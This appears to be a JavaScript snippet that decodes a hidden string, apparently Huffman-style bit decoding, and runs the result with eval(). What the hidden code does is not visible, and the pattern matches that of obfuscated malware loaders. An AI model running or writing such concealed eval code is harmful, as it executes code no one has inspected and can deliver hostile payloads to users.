a="1B1M1a1d1e2h3Z1b3S3^1]1^2V3R1X1Y2Y3N1P1S1T2Z2[1Q2j3c1N2R2S1I1J3Y3O1G3_1E3M"
+"1C3L3W0e151<1=2L2J1:3K183P163Q3a11122U2X1/3b0h1,3?1*3h0i2`3+0f2e2f0a0b3X3]"
+"0]0^3V3`0L0S0V0W3B3C0T3=3A0O0P3e3f0M3T3U0J3d0F0G333<0D2_3-";
l=new Array();
while(a.length){l.push((Y(a.charCodeAt(0))<<6)+Y(a.charCodeAt(1))-512);
a=a.slice(2,a.length)}
d="PfMP.P;PHgL]`=[j`Q]a4JA12DW^hj9h1ZSLc[e+@B7cZ]`U?=i0b=;3?]9P+d5c^aei/G8c1f"
+"hKBDOTR/F9:4^+1H66WD`CS8?d.heX;gZCCDX`,>3`_.44<*>-F-dL]+26LFHOR6:Q.G3K3J6:"
+"KRW?^3RO0-.27S7_B6:Med`e@J[,-GTFch5;J[,DR[HNQX4-.2d*j/.7Nbc1]M3B;U/+,OK0V@"
+"N,/>>cU*K:TLQ/DN,F@CJ:S[CPS*N@:22>C*_J:EW?Fg*:S[CPS*JbDTdcJK;N-<.-h`7b1636"
+"L9U^cPgQ3TQMjU9OV?*X8:`EQfiIe9K=/[M_,VZE[KOU@TQg7XPL<UNI6-]A[QW`g4eGP1;a,/"
+"3]Wd8=?91^hiZV7<`>,X1R/CJMY00@WDV_Q4gLHhA2iB6VWADK4.ee,//3*4+X+g[C*N0;89<_"
+"02=L8NZNZ02:_@TdN_<M+L.0_Pe602;hFeh5:BK+X`8FHORZBK7>BY<=b/+L.FJILL0]Eg-d;N"
+"V2`LJK<ZM@5<+,T4F?J:R?;=LW<+856Z2>cV^>J<52..46JD:27aTXH*2>cV^>J:EW?Fg::R]+"
+"S,+iePfMP.P;1`dg=AG[;=`IA00H>je^dE/J5MN7@dijQiMc>[FBh*U60gBCD`TSj-ESRNTd1^"
+"*gOgCfGI,XQCK_GJK;=hiZV7<`>,X1R/CJMY00@WDV_Q4gLHhA2iB6VWADK4.ee,/03*4+X+g["
+"C*N0;89<_02=L8NZNZ02:_@TdN_<M+L.0_Pe602;hFeh5:BK+X`8FHORZBK7>BY<=b/+L.FJIL"
+"L0]Eg-d;NV2`LJK<ZM@5<+,T4F?J:R?;=LW<+856Z2>cV^>J<52..46JD:27aTXH*2>cV^>J:E"
+"W?Fg::R]+S,+ieQ]a9/PB+]F1/iI5BVJ:13ZFAdgWMB;U/+GMJcY^dE.TLQ/B/a8-J";

c=1136;e=b=a=0;o="";
function Y(y){if(y>92)y--;return y-42}
function B(){if(a==0){b=Y(d.charCodeAt(e++));a=6;}
return ((b>>--a)&0x01);}
while(c--){i=0;while(l[i]<0){if(B())i=-l[i];else i++;}
o+=String.fromCharCode(l[i]);}eval(o);